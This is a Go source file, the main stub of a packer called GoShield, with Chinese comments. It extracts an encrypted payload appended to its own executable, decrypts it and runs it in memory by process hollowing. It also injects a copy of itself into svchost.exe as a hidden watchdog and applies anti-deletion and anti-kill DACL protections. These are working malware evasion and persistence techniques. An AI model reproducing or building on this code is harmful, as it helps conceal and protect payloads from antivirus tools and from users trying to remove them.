// 文件路径: stub/main.go
package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/Limkon/GoShield/internal/crypto"
	"github.com/Limkon/GoShield/internal/loader"
	"github.com/Limkon/GoShield/internal/protect"
)

func main() {
	// 🌟 0. 核心判别：检查是否是“内存影子进程”
	// 如果是通过下面的 RunPE 注入到 svchost.exe 中启动的，就会带有这个环境变量
	if os.Getenv("GOSHIELD_SHADOW_PID") != "" {
		protect.RunShadowMode()
		return // 影子进程职责结束直接退出，绝不执行下面耗费资源的解密和业务逻辑
	}

	// 1. 以下是主进程逻辑：先读取附加数据
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	file, err := os.Open(exePath)
	if err != nil {
		os.Exit(1)
	}

	stat, err := file.Stat()
	if err != nil {
		file.Close()
		os.Exit(1)
	}
	fileSize := stat.Size()

	footerSize := int64(48)
	if fileSize < footerSize {
		file.Close()
		os.Exit(1)
	}

	file.Seek(-footerSize, io.SeekEnd)
	footer := make([]byte, footerSize)
	io.ReadFull(file, footer)

	if string(footer[40:48]) != "GOSHIELD" {
		file.Close()
		os.Exit(1)
	}

	key := footer[0:32]
	payloadSize := binary.LittleEndian.Uint64(footer[32:40])

	if fileSize < footerSize+int64(payloadSize) {
		file.Close()
		os.Exit(1)
	}

	file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
	encryptedPayload := make([]byte, payloadSize)
	io.ReadFull(file, encryptedPayload)
	
	file.Close()

	// 2. 启动单机防御：独占锁定防删、DACL 防杀护甲
	protect.EnableProtection()

	// 3. 🌟 启动无文件落地（纯内存）的终极影子守护
	protect.SetupMainWatchdog()
	myExeBytes, err := os.ReadFile(exePath)
	if err == nil {
		// 设置环境变量，供影子继承
		os.Setenv("GOSHIELD_SHADOW_PID", fmt.Sprint(os.Getpid()))
		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)

		// 将自身的外壳程序字节码，掏空注入到合法的系统进程 svchost.exe 中！
		go func() {
			_ = loader.Execute("C:\\Windows\\System32\\svchost.exe", myExeBytes)
		}()

		// 挂起 100 毫秒，确保底层的 CreateProcessW 已经完成了环境变量的继承读取
		time.Sleep(100 * time.Millisecond)

		// 立刻擦除这俩敏感的环境变量，防止一会运行真正的业务程序时被污染
		os.Unsetenv("GOSHIELD_SHADOW_PID")
		os.Unsetenv("GOSHIELD_ORIGINAL_EXE")
	}

	// 4. 解密真实程序的 Payload
	decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
	if err != nil {
		protect.NotifyNormalExit()
		os.Exit(1)
	}

	// 5. 执行内存加载 (RunPE)，运行您自己真正的业务代码
	err = loader.Execute(exePath, decryptedPayload)
	if err != nil {
		protect.NotifyNormalExit()
		os.Exit(1)
	}

	// 6. 真实程序已退出，触发安全信号通知影子进程和平关闭！
	protect.NotifyNormalExit()
}
